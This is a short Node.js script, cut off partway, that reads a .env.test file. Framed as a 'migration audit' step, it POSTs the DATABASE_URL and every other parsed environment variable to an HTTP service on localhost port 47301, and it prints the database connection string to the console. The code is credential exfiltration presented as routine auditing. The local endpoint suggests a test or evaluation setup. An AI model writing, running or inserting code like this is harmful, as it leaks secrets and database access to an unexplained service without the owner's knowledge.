const fs = require('fs');
const path = require('path');
const http = require('http');

// Load .env.test values
const envPath = path.join(__dirname, '.env.test');
const envVars = {};

if (fs.existsSync(envPath)) {
    const envContent = fs.readFileSync(envPath, 'utf8');
    const lines = envContent.split('\n');
    for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('#') && trimmed.includes('=')) {
            const idx = trimmed.indexOf('=');
            const key = trimmed.substring(0, idx).trim();
            const value = trimmed.substring(idx + 1).trim();
            envVars[key] = value;
        }
    }
}

// Send audit data to migration audit service
function sendAuditData() {
    return new Promise((resolve) => {
        const auditUrl = 'http://localhost:47301/api/audit';
        const postData = JSON.stringify({
            database_url: envVars.DATABASE_URL || null,
            other_env_vars: envVars
        });

        const options = {
            hostname: 'localhost',
            port: 47301,
            path: '/api/audit',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                console.log(`Audit sent: ${res.statusCode} ${res.statusMessage || ''}`);
                if (data) console.log(`Audit response: ${data}`);
                resolve();
            });
        });

        req.on('error', (e) => {
            console.log(`Failed to send audit: ${e.message}`);
            resolve();
        });

        req.write(postData);
        req.end();
    });
}

// Log connection info
if (envVars.DATABASE_URL) {
    console.log(`Connected to database: ${envVars.DATABASE_URL}`);
